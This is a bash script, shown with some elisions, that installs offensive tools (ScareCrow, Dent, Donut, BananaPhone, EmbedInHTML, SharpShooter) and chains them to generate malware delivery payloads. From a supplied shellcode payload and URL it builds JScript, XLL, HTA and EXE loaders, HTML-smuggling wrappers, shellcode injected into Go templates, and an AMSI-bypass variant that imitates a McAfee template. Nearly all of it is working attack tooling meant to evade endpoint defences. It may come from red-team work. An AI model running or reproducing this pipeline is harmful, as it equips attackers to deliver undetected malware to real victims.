...
# Check for Dent
if [[ -d "/root/tools/Dent" ]]
	then
		echo "[+] Dent... check"
	else
		echo "[+] No Dent ... attempting to install"
		cd /root/tools && git clone https://github.com/optiv/Dent.git
		cd /root/tools/Dent && go build Dent.go
...
if  [[ -d "/root/tools/sgn" ]]
	then
		...
		cd /root/tools && git clone https://github.com/EgeBalci/sgn.git
	fi
#Check For wclang	
if [[ -d "/root/tools/wclang" ]]
	then
		echo "[+] wclang ... check!"
	else
		echo "[+] No wclang ... attempting to install"
		cd /root/tools && git clone https://github.com/tpoechtrager/wclang.git
	fi
# Check for ScareCrow
if [[ -d "/root/tools/ScareCrow" ]]
	then
		...
		cd /root/tools && git clone https://github.com/optiv/ScareCrow.git
		cd /root/tools/ScareCrow && go build ScareCrow.go
	fi
#Check for Donut
if [[ -d "/root/tools/BananaPhone" ]]
	then
		if test -f "/root/tools/donut/donut"; then
				echo "[*] Donut .. check "
			
			else
				echo "[+] donut directory found but binary not made, attempting to make"
				cd /root/tools/donut && make
			fi
	else
	echo "[+] No donut found ... attempting to install"
	cd /root/tools && git clone https://github.com/TheWover/donut.git
...
if [[ -d "/root/tools/BananaPhone" ]]
	then
		...
		cd /root/tools/ && git clone https://github.com/C-Sto/BananaPhone.git
	fi
# Check for EmbedInHTML
if [[ -d "/root/tools/EmbedInHTML" ]]
	then
		echo "[+] EmbedInHTML ... check!"
	else
		echo "[+] No EmbedInHTML ... attempting to install"
		cd /root/tools/ && git clone https://github.com/Arno0x/EmbedInHTML.git
	fi
...
read url
       ...
       /root/tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless  -Loader wscript -url $url -domain $domain -O $payload_dir/01-scarywscript.js	
       /root/tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless -Loader excel -url $url -domain $domain -O $payload_dir/02-scaryexcel.js 
       /root/tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless  -Loader msiexec -url $url -domain $domain -O $payload_dir/03-scarymsiexec.js
       
       #Wrap JS Payloads
       cd /root/tools/EmbedInHTML/ && python embedInHTML.py -k supersecretpass123 -f $payload_dir/01-scarywscript.js -o 01-scarywscript.html
       cd /root/tools/EmbedInHTML/ && python embedInHTML.py -k supersecretpass123 -f $payload_dir/02-scaryexcel.js -o 02-scaryexcel.html
       cd /root/tools/EmbedInHTML/ && python embedInHTML.py -k supersecretpass123 -f $payload_dir/03-scarymsiexec.js -o 03-scarymsiexec.html
       cp /root/tools/EmbedInHTML/output/* $payload_dir
       cd $payload_dir
       
       #create DENT payload
	/root/tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless -domain $domain -Loader excel -O $payload_dir/scarecrow-output.xll 
	...
	/root/tools/Dent/Dent -N cisadent.xll -U $url/ -F https-scarecrow.xll
	...
	cd $payload_dir
       ...
       #Create BananPhone
       if test -f "/root/tools/BananaPhone/example/hideexample/nobanana/main.go.bak";then
       cp /root/tools/BananaPhone/example/hideexample/nobanana/main.go.bak /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       fi
       echo "[+] $payload64stageless  found ... Generating Generating Shellcode for BananPhone Payload"
       cp /root/tools/BananaPhone/example/hideexample/nobanana/main.go /root/tools/BananaPhone/example/hideexample/nobanana/main.go.bak
       echo "copying Payload64.cs shellcode into bananaphone Template"
       sed -i '7,24d' /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i "7r$payload_dir/payload64.cs" /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i '8d' /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i "8i\\var shellcode = []byte{" /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i 's/byte\[\].*\] {//g' /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i 's/ };/,}\n/g' /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       ...
       cp /root/tools/BananaPhone/example/hideexample/nobanana/nobanana.exe $payload_dir/04-banana.exe
       cd $payload_dir
       ...
       cp /root/tools/BananaPhone/example/hideexample/nobanana/main.go /root/tools/BananaPhone/example/hideexample/nobanana/main.go.bak
       /root/tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless -Loader binary -domain $domain 
       echo "[+] Enter the name of the above generated Scary payload (E.g Onenote.exe Excel.exe Lync.exe etc)"
       read scary_payload
       if test -f "/root/tools/donut";then
       /root/tools/donut/donut -a 2 -f 7 -o $payload_dir/donut_payload.bin $scary_payload
       else
       ...
       sed -i '7,24d' /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i "7r$payload_dir/donut_payload.bin" /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i '8d' /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i "8i\\var shellcode = []byte{" /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       sed -i 's/0x00};/0x00, }\n/g' /root/tools/BananaPhone/example/hideexample/nobanana/main.go
       echo "Copy Complete, Generating BananaPhone Payload"
       ...
       cd /root/tools/SharpShooter; python SharpShooter.py --dotnetver 2 --delivery web --payload hta --shellcode --scfile $payload_dir/payload32_sharpshooter.cs --smuggle --template sharepoint --web https://$domain/06-https-sharp.payload --output 06-https-sharp
       ...
       python /root/tools/SharpShooter/SharpShooter.py --stageless --dotnetver 4 --payload hta --output 07-SharpShooterAmsiBypass --rawscfile $payload_dir/$payload32stageless --smuggle --template mcafee --amsi amsienable
       
       cp /root/tools/SharpShooter/output/* $payload_dir/
